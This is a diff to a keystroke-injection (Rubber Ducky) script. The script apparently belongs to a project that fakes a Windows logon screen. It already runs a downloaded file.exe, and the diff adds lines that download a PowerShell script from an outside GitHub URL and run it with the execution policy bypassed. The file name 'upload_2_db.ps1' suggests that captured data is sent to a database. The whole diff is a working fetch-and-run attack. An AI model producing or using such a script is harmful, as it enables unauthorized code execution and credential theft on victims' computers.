@@ -13,3 +13,12 @@ DELAY 5000
 REM Run the downloaded file
 STRING Start-Process "$env:USERPROFILE\Downloads\file.exe"
 ENTER
+
+REM Download the PowerShell script using PowerShell
+STRING (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/main/upload_2_db.ps1", "$env:USERPROFILE\Downloads\upload_2_db.ps1")
+ENTER
+DELAY 5000
+
+REM Run the downloaded PowerShell script
+STRING powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\Downloads\upload_2_db.ps1"
+ENTER
